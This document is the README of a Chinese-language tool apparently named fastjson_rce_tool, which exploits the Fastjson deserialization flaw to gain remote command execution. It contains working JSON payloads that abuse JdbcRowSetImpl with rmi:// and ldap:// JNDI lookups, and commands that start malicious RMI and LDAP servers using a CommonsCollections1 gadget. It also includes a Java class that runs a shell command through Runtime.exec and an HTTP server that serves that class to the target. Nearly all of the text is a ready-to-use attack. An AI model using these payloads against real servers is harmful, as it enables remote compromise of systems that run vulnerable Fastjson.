# fastjson_rce_tool

```
随着各种关于安全的法律出台，该项目2020年初开始不对外开放。

备注：这里的利用方式可以突破一些限制条件，来完成命令执行。


rmi:
1. 启动RMI服务，后面写要执行的语句(有依赖，tomcat8稳定复现)
java -cp fastjson_tool.jar EvilRMIServer 8888 53 "curl dnslog.wyzxxz.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8888/Object","autoCommit":true}

3. 查看日志是否curl成功

===================================================================================================

ldap:
1. 启动LDAP服务，后面写要执行的语句
java -cp fastjson_tool.jar LDAPRefServer2 8888 CommonsCollections1 "curl dnslog.cn"

2. 发送请求包
POST /test HTTP/1.1
Host: 127.0.0.1
Content-Type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Accept: */*
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) 

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}


3. 查看日志是否执行成功

===================================================================================================
else:

有些环境可能利用不成功，可以尝试默认的测试方法,
例如：
生成测试的class文件，
import java.lang.Runtime;
import java.lang.Process;

public class Object {
    public Object() throws Exception {
        Runtime.getRuntime().exec("curl dnslog.cn");
   }
}
启动http服务器
import java.io.*;
import java.net.*;
import com.sun.net.httpserver.*;

public class RMIService {
    public static void main(String[] args) {
        try {
            String serverAddress = args[0];
            int localport = Integer.parseInt(args[1]);
            System.out.println("Starting HTTP server");
            HttpServer httpServer = HttpServer.create(new InetSocketAddress(localport), 0);
            httpServer.createContext("/",new HttpFileHandler());
            httpServer.setExecutor(null);
            httpServer.start();
            System.out.println("\nEvilobject: http://"+serverAddress+":"+localport+"/Object.class");

        } catch(Exception e) {
            e.printStackTrace();
        }
    }
}
启动ldap服务，从http服务获取class
java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888

查询执行结果

```


![0](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/work.png)

![1](https://github.com/wyzxxz/fastjson_rce_tool/blob/master/2.png)

